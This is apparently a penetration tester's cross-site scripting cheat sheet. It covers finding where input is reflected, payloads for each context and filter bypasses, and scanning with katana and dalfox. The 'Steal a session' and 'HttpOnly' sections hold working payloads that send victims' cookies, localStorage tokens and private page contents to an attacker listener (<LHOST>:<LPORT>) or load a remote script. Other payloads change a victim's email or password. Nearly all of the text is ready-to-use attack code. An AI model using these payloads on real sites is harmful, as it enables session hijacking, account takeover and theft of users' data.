# XSS

## Where my input lands
A marker in every input that comes back: the query, the path, form fields, headers and JSON values.
xss8f3k'"<>
- [ ] The page source, Ctrl+U, searched for xss8f3k: which characters survived, and whether it sits between tags, in an attribute or in a script
- [ ] Stored input, such as a comment, a profile or a support ticket: shown to an admin later, so worth the most
<script>alert(1)</script>

## A payload for the place
Between tags:
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
Out of an attribute:
"><svg onload=alert(1)>
" autofocus onfocus=alert(1) x="
Out of a string in a script:
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>
In a link, an href or src:
javascript:alert(document.domain)
Out of a title or a textarea:
</title><svg onload=alert(1)>
</textarea><svg onload=alert(1)>
From the path, not a parameter:
curl -sk "<Scheme>://<WebHost>/THE-PAGE/x%22%3E%3Csvg%20onload=alert(1)%3E"

## Past a filter
<sCrIpT>alert(1)</sCrIpT>
<scr<script>ipt>alert(1)</scr<script>ipt>
<svg/onload=alert(1)>
<img/src/onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<svg onload=alert`1`>
<svg onload=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
<iframe srcdoc="<svg onload=alert(1)>">
- [ ] PortSwigger's XSS cheat sheet, portswigger.net/web-security/cross-site-scripting/cheat-sheet, for every tag and event a filter lets through
- [ ] The same payloads inside a JSON value that a page later shows unencoded

## Steal a session
A listener first: an admin bot may visit only once, every few minutes.
nc -lvnp <LPORT>
python3 -m http.server <LPORT>
<script>new Image().src="http://<LHOST>:<LPORT>/?c="+encodeURIComponent(document.cookie)</script>
<img src=x onerror="this.src='http://<LHOST>:<LPORT>/?c='+document.cookie">
A token in localStorage, sent by POST, which needs nc rather than http.server:
<script>fetch("http://<LHOST>:<LPORT>/",{method:"POST",body:JSON.stringify(localStorage)})</script>
A long payload, kept on Kali as x.js in the served folder:
<script src="http://<LHOST>:<LPORT>/x.js"></script>
- [ ] No callback: the target may block that port or set a CSP, so another <LPORT> such as 443 or 8080, or an action in the browser as below

## Use the stolen session
curl -sk <Scheme>://<WebHost>/THE-PAGE -H 'Cookie: THE-COOKIE'
- [ ] Or in the browser: F12, Storage, Cookies, my own value replaced with the stolen one, then a refresh

## The cookie is HttpOnly
The script cannot read it, but it runs logged in as the victim. A page only they can see, sent back:
<script>fetch("/THE-PAGE").then(r=>r.text()).then(t=>fetch("http://<LHOST>:<LPORT>/",{method:"POST",body:t}))</script>
An action as the victim, such as a new email or password, with any CSRF token the form needs in THE-BODY:
<script>fetch("/THE-PAGE",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"THE-BODY"})</script>

## Many URLs at once
katana -u <Scheme>://<WebHost> -d 5 -jc | grep '=' | sort -u > params.txt
dalfox file params.txt -o dalfox.txt
dalfox url '<Scheme>://<WebHost>/THE-PAGE?<Param>=x' -C 'THE-COOKIE' -b http://<LHOST>:<LPORT>/
- [ ] Every finding opened in the browser: scanners also report reflections that never run
